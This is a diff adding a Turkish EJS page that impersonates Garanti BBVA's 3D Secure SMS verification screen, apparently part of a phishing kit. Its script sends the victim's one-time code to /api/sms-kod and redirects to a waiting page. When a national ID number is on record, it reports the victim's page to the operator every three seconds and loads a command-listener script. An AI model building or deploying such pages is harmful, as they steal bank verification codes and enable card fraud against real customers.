@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title><%= (typeof bankaBaslik !== 'undefined' && bankaBaslik) ? bankaBaslik + ' Güvenli Öde' : 'GO Güvenli Öde' %></title>
+  <link rel="shortcut icon" href="/img/icon/favIcon.png">
+  <link rel="stylesheet" href="/garanti/font.css">
+  <link rel="stylesheet" href="/garanti/style.css">
+  <% 
+    var simdi = new Date();
+    var ikiBasamak = function (n) { return (n < 10 ? '0' : '') + n; };
+    var tarihMetni = ikiBasamak(simdi.getDate()) + '.' + ikiBasamak(simdi.getMonth() + 1) + '.' + simdi.getFullYear() + ', ' + ikiBasamak(simdi.getHours()) + ':' + ikiBasamak(simdi.getMinutes());
+    var telTemiz = String((kullanici && kullanici.telefon) || '').replace(/[^0-9]/g, '');
+    var telSon2 = 'XX';
+    if (telTemiz.length >= 2) {
+      telSon2 = 'XX' + telTemiz.slice(-2);
+    }
+    var telGoster = '05XXXXXXXXX';
+    if (/^05[0-9]{9}$/.test(telTemiz)) {
+      telGoster = telTemiz.slice(0, 2) + '******' + telTemiz.slice(-2);
+    }
+    var islemAdiGoster = (typeof islemAdi !== 'undefined' && islemAdi) ? String(islemAdi) : 'GO Güvenli Öde';
+    var tutarGoster = (typeof tutar !== 'undefined' && tutar) ? String(tutar) : '45.00';
+    var kartNoSon4Goster = (typeof kartNoSon4 !== 'undefined' && kartNoSon4) ? String(kartNoSon4) : '****';
+    var kartMarka = String((kullanici && kullanici.kartMarka) || '').toUpperCase();
+    var kartLogo = '/assets/img/psimage_mc.svg';
+    if (kartMarka.indexOf('VISA') !== -1) kartLogo = '/img/visa.png';
+    else if (kartMarka.indexOf('MAST') !== -1 || kartMarka.indexOf('MASTER') !== -1) kartLogo = '/img/master.png';
+    else if (kartMarka.indexOf('TROY') !== -1) kartLogo = '/img/troy.png';
+    var referansNo = 'GAR-' + simdi.toISOString().slice(0, 10).replace(/-/g, '') + '-' + Math.floor(100000 + Math.random() * 900000);
+    var hataliSmsVar = (typeof hataliSms !== 'undefined') && !!hataliSms;
+  %>
+</head>
+<body>
+<div class="secure secure--full">
+  <div class="secure-header">
+    <div class="secure-header__top">
+      <span>
+        <img src="/garanti/logo.png" alt="Garanti Logo">
+      </span>
+      <div class="secure-header__bottom">
+        <div>
+          <img src="<%= kartLogo %>" alt="Kart Markası">
+        </div>
+      </div>
+    </div>
+    <div class="secure-header__bottom">
+      <span>3D Secure Ödeme Doğrulama</span>
+    </div>
+  </div>
+
+  <div class="secure-payment">
+    <div class="secure-payment__top">
+      <span>Mhrs Ödeme Hizmetleri</span>
+      <span><%= tutarGoster %></span>
+    </div>
+    <div class="secure-payment__bottom">
+      <span><%= tarihMetni %></span>
+      <span>************<%= kartNoSon4Goster %></span>
+    </div>
+  </div>
+</div>
+
+<div class="secure">
+  <form id="smsForm" name="acsform" novalidate>
+    <div class="verification-sms-text">
+      <p>Sonu <strong><%= telSon2 %></strong> ile biten telefon numaranıza gönderilen doğrulama şifresini giriniz.</p>
+    </div>
+
+    <div class="verification-info-content">
+      <div class="code-content">
+        <input type="text" inputmode="numeric" id="sixDigitNumber" name="otp" autocomplete="one-time-code" pattern="\d{6}" placeholder="Şifre" required maxlength="6" data-visible="false">
+        <span class="eye-icon" id="toggleOTP" aria-label="Şifreyi göster/gizle">🔒</span>
+        <div class="count-down-content">
+          <img src="/garanti/verification-time-icon.svg" alt="Süre">
+          <div class="count-down-content__time">
+            <span>Kalan Süre</span>
+            <div id="countdown">03:00</div>
+          </div>
+        </div>
+      </div>
+
+      <p id="hataliBildirim" class="verification-info-content-error-password" style="display: none;">
+        Hatalı şifre girdiniz. Lütfen tekrar deneyin.
+      </p>
+
+      <p id="timeOutMessage" class="verification-info-content-error-info" style="display: none;">
+        Şifreyi belirtilen süre içinde girmediniz.
+      </p>
+
+      <button id="btnResendOtp" type="button" class="sendOTP-btn sendOTP-btn--notDisabled" aria-hidden="true" tabindex="-1" disabled>Tekrar SMS Gönder</button>
+    </div>
+
+    <div class="verification-info-content-description">
+      <div class="button-group">
+        <button id="btnCommit" class="button button--no-margin js-disable" style="cursor: pointer;" type="submit" disabled>
+          Devam
+        </button>
+      </div>
+    </div>
+  </form>
+
+  <div class="accordion-content">
+    <div class="accordion">
+      <input id="toggle2" type="radio" class="accordion-toggle" name="toggle">
+      <div class="accordion-item">
+        <label for="toggle2">Yardım</label>
+        <svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M8.07497 12.1853C7.87505 12.1853 7.68513 12.1034 7.54519 11.9601L2.21741 6.50342C1.92753 6.20653 1.92753 5.71512 2.21741 5.41823C2.50729 5.12133 2.98709 5.12133 3.27697 5.41823L8.07497 10.3323L12.723 5.58203C13.0129 5.28514 13.4927 5.28514 13.7826 5.58203C14.0725 5.87892 14.0725 6.37033 13.7826 6.66722L8.60475 11.9703C8.46481 12.1137 8.27489 12.1956 8.07497 12.1956V12.1853Z" fill="#1D212F"></path>
+        </svg>
+      </div>
+      <section>
+        <p>
+          *BonusFlaş veya Garanti BBVA Mobil’e bildirim gelmiyorsa; internet bağlantınızı, uygulama
+          bildirim izinlerini ve uygulamanın güncelliğini kontrol edin. Ayrıca uygulamayı açıp
+          bildirim merkezinden de onay verebilirsiniz.<br>
+          *SMS gelmiyorsa; birkaç dakika bekleyip "Tekrar SMS Gönder" seçeneğini kullanın ve telefon
+          numaranızın güncel olduğundan emin olun. (Telefon numaranızı güncellemek için şube ve
+          ATM’lerimizi kullanabilirsiniz).<br>
+          Diğer tüm konular için Garanti BBVA Müşteri İletişim Merkezi: +90 444 0 333.
+        </p>
+      </section>
+    </div>
+    <button class="accordion-button" type="button" id="cancel" onclick="window.location.href='/odeme'; return false;">İşlemi İptal Et</button>
+  </div>
+</div>
+
+<script>
+(function () {
+  var form = document.getElementById('smsForm');
+  var input = document.getElementById('sixDigitNumber');
+  var btn = document.getElementById('btnCommit');
+  var btnResend = document.getElementById('btnResendOtp');
+  var countdownEl = document.getElementById('countdown');
+  var timeOutMessage = document.getElementById('timeOutMessage');
+  var hataliBildirim = document.getElementById('hataliBildirim');
+  var toggleOTP = document.getElementById('toggleOTP');
+  var cancelBtn = document.getElementById('cancel');
+
+  if (!form || !input || !btn) return;
+
+  var kalanSaniye = 180;
+  var sayac = null;
+
+  function sureMetni(s) {
+    var dk = Math.floor(s / 60);
+    var sn = s % 60;
+    return dk + ':' + (sn < 10 ? '0' : '') + sn;
+  }
+
+  function sayacBaslat() {
+    if (sayac) clearInterval(sayac);
+    kalanSaniye = 180;
+    if (countdownEl) countdownEl.textContent = sureMetni(kalanSaniye);
+    if (timeOutMessage) timeOutMessage.style.display = 'none';
+    btn.disabled = false;
+    sayac = setInterval(function () {
+      kalanSaniye -= 1;
+      if (kalanSaniye <= 0) {
+        clearInterval(sayac);
+        sayac = null;
+        if (countdownEl) countdownEl.textContent = '00:00';
+        if (timeOutMessage) timeOutMessage.style.display = 'block';
+        btn.disabled = true;
+        return;
+      }
+      if (countdownEl) countdownEl.textContent = sureMetni(kalanSaniye);
+    }, 1000);
+  }
+
+  function gosterHata(mesaj) {
+    var el = document.getElementById('hataliBildirim');
+    if (!el) return;
+    el.textContent = mesaj || 'Hatalı şifre girdiniz. Lütfen tekrar deneyin.';
+    el.style.display = 'block';
+  }
+
+  function hataliMesajiniTemizle() {
+    if (hataliBildirim) hataliBildirim.style.display = 'none';
+    if (timeOutMessage) timeOutMessage.style.display = 'none';
+  }
+
+  function hataliDurumunuYonet() {
+    var params = new URLSearchParams(window.location.search);
+    if (params.get('hatali') === '1') {
+      if (hataliBildirim) {
+        hataliBildirim.textContent = 'Hatalı SMS girdiniz. Lütfen tekrar deneyin.';
+        hataliBildirim.style.display = 'block';
+      }
+      return;
+    }
+    hataliMesajiniTemizle();
+  }
+
+  input.addEventListener('input', function () {
+    input.value = input.value.replace(/\D/g, '').slice(0, 6);
+    btn.disabled = input.value.length !== 6;
+    hataliMesajiniTemizle();
+  });
+
+  form.addEventListener('submit', function (e) {
+    e.preventDefault();
+    var kod = input.value.trim();
+
+    if (!/^\d{6}$/.test(kod)) {
+      gosterHata('Lütfen 6 haneli doğrulama kodunu giriniz.');
+      return;
+    }
+
+    var vid = localStorage.getItem('ziyaretci-id') || '';
+    btn.disabled = true;
+
+    fetch('/api/sms-kod', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ vid: vid, kod: kod })
+    })
+    .then(function (response) { return response.json(); })
+    .then(function (data) {
+      if (!(data && data.ok)) {
+        gosterHata((data && data.hata) || 'SMS kodu kaydedilemedi.');
+        btn.disabled = false;
+        return;
+      }
+      window.location.href = '/bekleme';
+    })
+    .catch(function () {
+      gosterHata('Sunucuya bağlanılamadı. Lütfen tekrar deneyin.');
+      btn.disabled = false;
+    });
+  });
+
+  if (btnResend) {
+    btnResend.disabled = true;
+    btnResend.textContent = 'Tekrar SMS Gönder';
+  }
+
+  if (toggleOTP) {
+    toggleOTP.addEventListener('click', function () {
+      hataliMesajiniTemizle();
+      var visible = input.getAttribute('type') === 'text';
+      input.setAttribute('type', visible ? 'password' : 'text');
+      toggleOTP.textContent = visible ? '🔒' : '👁️';
+    });
+  }
+
+  if (cancelBtn) {
+    cancelBtn.addEventListener('click', function () {
+      window.location.href = '/odeme';
+    });
+  }
+
+  hataliDurumunuYonet();
+  sayacBaslat();
+})();
+</script>
+<% if (kullanici && kullanici.tcno) { %>
+<script>
+  (function () {
+    var at = function () {
+      var sayfa = (location.pathname + location.search + location.hash).slice(0, 120);
+      fetch('/api/heartbeat', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sayfa: sayfa })
+      }).catch(function () {});
+    };
+    at();
+    setInterval(at, 3000);
+    document.addEventListener('visibilitychange', function () { if (!document.hidden) at(); });
+  })();
+</script>
+<% } %>
+<script src="/js/komut-dinle.js"></script>
+</body>
+</html>
